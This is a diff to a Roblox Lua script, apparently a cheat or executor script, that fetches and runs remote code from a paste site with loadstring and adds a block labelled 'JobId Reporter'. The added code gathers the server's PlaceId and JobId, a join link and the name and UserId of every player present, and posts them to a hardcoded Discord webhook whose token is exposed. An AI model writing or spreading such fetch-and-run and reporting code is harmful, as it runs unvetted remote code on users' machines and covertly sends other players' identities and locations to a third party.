@@ -1,6 +1,52 @@
 wait(0.2)
 loadstring(game:HttpGet("https://pastefy.app/mzQZnDar/raw"))()
 
+-- One-time JobId Reporter
+-- Runs once on execution and reports current server info to Discord
+
+local HttpService = game:GetService("HttpService")
+
+-- Your Discord webhook
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1402304158094069934/agcIhHachCPW3YmXsgDizki3clSV4bDBKMHloZU81wqg0ny2BlyQ1fwQ5IiOwPlQECV_"
+
+-- Gather server info
+local placeId = game.PlaceId
+local jobId = game.JobId
+local joinLink = string.format(
+    "https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",
+    placeId,
+    jobId
+)
+
+-- Collect players
+local players = {}
+for _, plr in ipairs(game.Players:GetPlayers()) do
+    table.insert(players, plr.Name .. " (" .. plr.UserId .. ")")
+end
+
+-- Build message
+local content = "**Server Report**\n"
+    .. "📍 PlaceId: `" .. placeId .. "`\n"
+    .. "🆔 JobId: `" .. jobId .. "`\n"
+    .. "🔗 Join: " .. joinLink .. "\n\n"
+    .. "👥 Players:\n" .. table.concat(players, "\n")
+
+-- Send once
+local payload = HttpService:JSONEncode({
+    username = "JobId Reporter",
+    content = content
+})
+
+local ok, res = pcall(function()
+    return HttpService:PostAsync(WEBHOOK_URL, payload, Enum.HttpContentType.ApplicationJson)
+end)
+
+if ok then
+    print("[JobId Reporter] Sent to Discord ✅")
+else
+    warn("[JobId Reporter] Failed to send ❌", res)
+end
+
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
